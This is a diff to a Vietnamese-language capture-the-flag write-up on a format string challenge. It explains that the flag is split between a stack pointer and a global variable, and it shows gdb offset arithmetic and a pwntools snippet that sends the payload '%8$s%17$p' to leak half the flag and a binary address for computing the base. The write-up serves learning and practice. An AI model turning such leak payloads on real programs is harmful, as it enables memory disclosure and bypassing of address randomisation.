@@ -113,4 +113,21 @@ Script Python:
 
 ![Alt text](image/fs7.png)
 
+Flag được chia thành 2 phần: 1 nằm trong con trỏ ptr là biến cục bộ nằm trên Stack, 1 nằm trong biến toàn cục flag2.
 
+Ngoài ra có thêm 2 lỗ hổng Format string. 
+
+![Alt text](image/fs8.png)
+
+Nửa flag đầu có thể lấy từ Stack .Nhưng nửa sau nằm trong biến toàn cục yêu cầu cần có địa chỉ để truy cập. Trước tiên ta cần leak địa chỉ binary để tính base address.
+
+	# ((rsp+?)-rsp)/8+6
+	# p/d (0x7fffffffdee8-0x7fffffffde90)/8 +6
+	
+Dùng 
+
+	p.sendlineafter(b'Your name: ',b'%8$s%17$p')
+	
+	p.recvuntil(b'Hello ')
+	flag=p.recvuntil(b'0x',drop=True)
+	exe_leak=int(p.recvline()[:-1],16)   
